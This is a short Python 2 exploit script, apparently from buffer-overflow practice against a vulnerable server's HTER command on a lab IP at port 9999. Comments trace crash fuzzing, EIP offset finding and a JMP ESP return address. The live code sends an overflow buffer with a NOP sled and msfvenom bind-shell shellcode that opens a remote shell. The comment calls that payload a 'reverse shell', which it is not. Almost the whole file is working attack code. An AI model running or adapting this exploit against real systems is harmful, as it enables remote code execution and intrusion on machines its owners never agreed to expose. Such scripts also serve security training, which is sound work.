#!/usr/bin/python

import socket
import os
import sys
import time
import string

host = "192.168.112.145"
port = 9999

# 1 - Crash
# buffer = "HTER "+1000*"A"+1000*"B"+1000*"C"+1000*"D"+1000*"E"+2366*"F" -> C!
# buffer = "HTER "+2000*"F"+200*"A"+200*"B"+200*"C"+200*"D"+200*"E"+4366*"F" -> A!
# buffer = "HTER "+2000*"F"+40*"A"+40*"B"+40*"C"+40*"D"+40*"E"+5166*"F" -> B!
# buffer = "HTER "+2040*"F"+8*"A"+8*"B"+8*"C"+8*"D"+8*"E"+5286*"F" -> ABAAAAAA?
# buffer = "HTER "+2040*"F"+"A"+"BDEFFEBB"+"A"+5316*"F"

# 2 - Controlling EIP - ok
# buffer = "HTER "+2041*"F"+"ABCDACDC"+5317*"F"
# buffer = "HTER "+2041*"F"+"12341234"+5317*"F"
# buffer = "HTER "+2041*"F"+"56789012"+5317*"F"

# string.lowercase + string.uppercase

# 3 - JMP ESP
# 625011AF   FFE4             JMP ESP
# buffer = "HTER "+2041*"F"+"af115062"+5317*"F"
# buffer = "HTER "+2041*"F"+"af115062"+"12341234"+5317*"F"

# 4 - Reverse shell
# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f hex
payload = "ba28a41ccad9c0d97424f45e2bc9b15331561203561283eea0fe3f12407cbfea91e1490fa0212d449391250818596bb8ab2fa4cf1c8592fe9db6e7611ec53b411f064e80587ba3d031f716c4364dab6f0443ab8cdd629a03553d3ca2ba3575bcdf70cf372b0ece9165ef7ddc49027f196dfd0a538d800ca0ef5e983257143a9e69f9dd5565b6aa316a497e4a96c2819c1e90a5387a42c7192625f879899a5cf224ceec592123dd61b12b561283f4ccbcaf7dcb3bcf57abd32e58ccfaf40c9c94dd2c7764e1f8e26c4453119136039539df491a66ff71f00f688cfb3e35191d2ad54fb5c217b40e75679e261120c8f11eb1de55883a0d62a93c18c2beabd6838d4ae68965ee7556757966c1222e5818a6c2c3b2d41e95fd5cc566035d88d3274d54db6339088a3d97ee648c41b9db46053c105953417d2fbbf02876c43dbd7ebd235d8014e07d63bc1d163a559c7bbd80e3853e209c715e41993ed8bad32f8dbc404f84"
buffer = "HTER "+2041*"F"+"af115062"+"90"*100+payload+"F"*(5317-len(payload)-100)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send(buffer)
print s.recv(1024)
s.close()
